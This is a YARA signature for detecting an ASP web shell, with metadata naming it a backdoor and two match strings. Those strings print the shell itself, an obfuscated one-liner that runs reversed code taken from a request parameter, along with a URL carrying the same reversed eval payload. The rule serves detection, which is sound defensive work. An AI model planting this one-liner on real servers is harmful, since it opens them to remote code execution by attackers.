rule WebShell_BackDoor_Unlimit_Webshell_Webshells_New_Asp1_A_1744 {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/03/28"
    description = "Web shells - generated from file asp1.asp"
    family = "Webshell"
    hacker = "None"
    hash = "b63e708cd58ae1ec85cf784060b69cad"
    judge = "unknown"
    reference = "None"
    score = 70
    threatname = "WebShell[BackDoor]/Unlimit.Webshell.Webshells.New.Asp1.A"
    threattype = "BackDoor"
  strings:
    $s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
    $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
  condition:
    1 of them
}